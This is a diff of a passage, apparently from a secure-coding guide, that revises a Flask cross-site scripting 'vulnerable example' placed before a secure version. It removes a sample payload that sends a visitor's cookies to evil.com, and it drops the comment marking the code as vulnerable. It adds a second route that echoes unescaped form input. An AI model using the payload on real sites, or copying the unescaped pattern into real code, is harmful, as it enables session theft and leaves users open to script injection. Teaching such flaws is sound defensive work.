@@ -52,11 +52,14 @@ app = Flask(__name__)
 @app.route('/greet')
 def greet():
     name = request.args.get('name')
-    # VULNERABLE: User input directly in HTML response
-    html = '<h1>Hello, ' + name + '!</h1>'
-    return make_response(html)
+    html = "<h1>Hello " + name + "</h1>"
+    return html
 
-# Attack: GET /greet?name=<script>document.location='http://evil.com/?c='+document.cookie</script>
+@app.route('/profile')
+def profile():
+    bio = request.form.get('bio')
+    resp = make_response("<div>" + bio + "</div>")
+    return resp
 ```
 
 SECURE EXAMPLE:
